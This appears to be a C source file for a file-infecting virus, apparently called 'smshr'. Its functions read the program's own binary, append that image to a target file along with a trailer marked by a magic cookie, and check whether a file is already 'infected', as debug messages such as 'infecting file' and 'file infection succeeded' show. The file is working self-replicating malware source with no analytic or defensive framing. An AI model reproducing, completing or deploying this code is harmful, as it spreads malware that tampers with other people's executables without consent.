#include "config.h"

#include <stdio.h>
#include <stdlib.h>

#include "log.h"
#include "utils.h"

#pragma pack(push)  /* push current alignment to stack */
#pragma pack(1)     /* set alignment to 1 byte boundary */
_TRAILER_STRUCT_T
#pragma pack(pop)   /* restore original alignment from stack */

static int appendTrailer(FILE *fp, long int myOffset, size_t mySize)
{
    trailer_t *trl = calloc(1, sizeof(trailer_t));

    if (trl == NULL) return (ERR_OMEM);
    trl->magicNr = MAGIC_COOKIE;
    trl->rlEntryPt = (unsigned int *)0xff0000ff;
    trl->myOffset = (unsigned int *)myOffset;
    trl->mySize = mySize;
    if (fseek(fp, 0L, SEEK_END) != 0) goto fail;
    if (fwrite(trl, sizeof(trailer_t), 1, fp) != 1)
    {
        PE("fwrite");
        goto fail;
    }
    free(trl);
    return (ERR_OK);
fail:
    free(trl);
    return (ERR_FAIL);
}

static trailer_t * getTrailer(FILE *fp)
{
    trailer_t *trl = calloc(1, sizeof(trailer_t));

    if (trl == NULL)
    {
        return (NULL);
    }
    if (fseek(fp, -sizeof(trailer_t), SEEK_END) != 0)
    {
        E2("cant set pos in file stream")
        return (NULL);
    }
    if (feof(fp))
    {
        E2("EoF")
        return (NULL);
    }
#ifdef _SMSHR_DEBUG
    int sr;
    if ((sr = fread(trl, sizeof(trailer_t), 1, fp)) != 1)
    {
        if (ferror(fp))
        {
            PE("fread")
        }
        E("cant read trailer from file (got %d blocks; expected 1)", sr);
#else
    if (fread(trl, sizeof(trailer_t), 1, fp) != 1)
    {
        E2("cant read trailer from file")
#endif
        return (NULL);
    }
    if (trl->magicNr != MAGIC_COOKIE)
    {
        E("magicN mismatch; not infected (0x%08x != 0x%08x)", MAGIC_COOKIE, trl->magicNr)
        return (NULL);
    }
    return (trl);
}

static int appendBuf2Fp(char *buf, size_t siz, FILE *fp, long int *myOffset)
{
    if (fseek(fp, 0L, SEEK_END) != 0) return (ERR_FAIL);
    *myOffset = ftell(fp);
    if (fwrite(buf, 1, siz, fp) < siz) return (ERR_FAIL);
    return (ERR_OK);
}

static int mapMe(char *argv0, char **dstPtr, size_t *dstPtrLen)
{
    FILE *fp;
    trailer_t *trl;
    char *buf = NULL;
    long int siz, myStart = 0, mySiz = 0;

    fp = fopen(argv0, "rb");
    if (!fp) return (ERR_FAIL);
    if (fseek(fp, 0L, SEEK_END) != 0) goto fail;
    siz = ftell(fp);
    D2("Am I infected?")
    if ((trl = getTrailer(fp)) != NULL)
    {
        D2("im already infected")
        myStart = siz - sizeof(trailer_t) - trl->mySize;
        mySiz = trl->mySize;
    }
    else
    {
        mySiz = siz;
        myStart = 0;
    }
    if (fseek(fp, myStart, SEEK_SET) != 0) goto fail;
    buf = calloc(1, mySiz);
    if (fread(buf, 1, mySiz, fp) < mySiz) goto fail;
    *dstPtrLen = mySiz;
    *dstPtr = buf;
    fclose(fp);
    return (ERR_OK);
fail:
    E("copying myself into the memory failed (start: %ld |size: %ld)", myStart, mySiz);
    if (buf != NULL) free(buf);
    *dstPtrLen = 0;
    *dstPtr = NULL;
    fclose(fp);
    return (ERR_FAIL);
}

int infectFile(char *argv0, char *target)
{
    FILE *fp;
    char *buf = NULL;
    size_t siz = 0;
    long int myOffset;
    trailer_t *trl;

    D2("Is target infected?")
    fp = fopen(target, "rb");
    if (!fp) return (ERR_FAIL);
    if ((trl = getTrailer(fp)) != NULL)
    {
        D("target file '%s' already infected (magicN: 0x%08x)", target, MAGIC_COOKIE)
        _TRAILER_DBG_INFO(trl);
        goto done;
    }
    fp = fopen(target, "ab");
    if (!fp) return (ERR_FAIL);
    mapMe(argv0, &buf, &siz);
    D("infecting file '%s'", target);
    if (appendBuf2Fp(buf, siz, fp, &myOffset) == ERR_OK)
    {
        if (appendTrailer(fp, myOffset, siz) == ERR_OK)
        {
            D("file '%s' infected (magicN: 0x%08x)", target, MAGIC_COOKIE)
        }
        else
        {
            E2("appendTrailer() failed")
            goto fail;
        }
    }
    else
    {
        E2("appendBuf2Fp() failed");
        goto fail;
    }
    fflush(fp);
    fclose(fp);
#ifdef _SMSHR_DEBUG
    fp = fopen(target, "rb");
    if (!fp) return (ERR_FAIL);
    if ((trl = getTrailer(fp)) != NULL)
    {
        D2("file infection succeeded")
        _TRAILER_DBG_INFO(trl);
    }
    else
    {
        E2("file infection failed")
    }
    free(trl);
#endif // _SMSHR_DEBUG
done:
    fclose(fp);
    return (ERR_OK);
fail:
    fclose(fp);
    return (ERR_FAIL);
}
